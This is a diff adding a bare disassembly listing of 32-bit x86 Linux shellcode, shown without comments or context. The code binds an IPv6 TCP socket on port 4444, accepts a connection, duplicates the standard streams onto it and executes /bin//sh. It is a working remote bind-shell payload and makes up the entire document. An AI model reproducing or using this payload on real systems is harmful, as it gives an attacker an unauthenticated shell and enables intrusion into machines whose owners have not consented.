@@ -1,0 +1,53 @@
+00000000  31DB              xor ebx,ebx
+00000002  53                push ebx
+00000003  43                inc ebx
+00000004  53                push ebx
+00000005  6A0A              push byte +0xa
+00000007  89E1              mov ecx,esp
+00000009  6A66              push byte +0x66
+0000000B  58                pop eax
+0000000C  CD80              int 0x80
+0000000E  96                xchg eax,esi
+0000000F  99                cdq
+00000010  52                push edx
+00000011  52                push edx
+00000012  52                push edx
+00000013  52                push edx
+00000014  52                push edx
+00000015  52                push edx
+00000016  6668115C          push word 0x5c11
+0000001A  66680A00          push word 0xa
+0000001E  89E1              mov ecx,esp
+00000020  6A1C              push byte +0x1c
+00000022  51                push ecx
+00000023  56                push esi
+00000024  89E1              mov ecx,esp
+00000026  43                inc ebx
+00000027  6A66              push byte +0x66
+00000029  58                pop eax
+0000002A  CD80              int 0x80
+0000002C  B066              mov al,0x66
+0000002E  B304              mov bl,0x4
+00000030  CD80              int 0x80
+00000032  52                push edx
+00000033  52                push edx
+00000034  56                push esi
+00000035  89E1              mov ecx,esp
+00000037  43                inc ebx
+00000038  B066              mov al,0x66
+0000003A  CD80              int 0x80
+0000003C  93                xchg eax,ebx
+0000003D  59                pop ecx
+0000003E  6A3F              push byte +0x3f
+00000040  58                pop eax
+00000041  CD80              int 0x80
+00000043  49                dec ecx
+00000044  79F8              jns 0x3e
+00000046  682F2F7368        push dword 0x68732f2f
+0000004B  682F62696E        push dword 0x6e69622f
+00000050  89E3              mov ebx,esp
+00000052  50                push eax
+00000053  53                push ebx
+00000054  89E1              mov ecx,esp
+00000056  B00B              mov al,0xb
+00000058  CD80              int 0x80
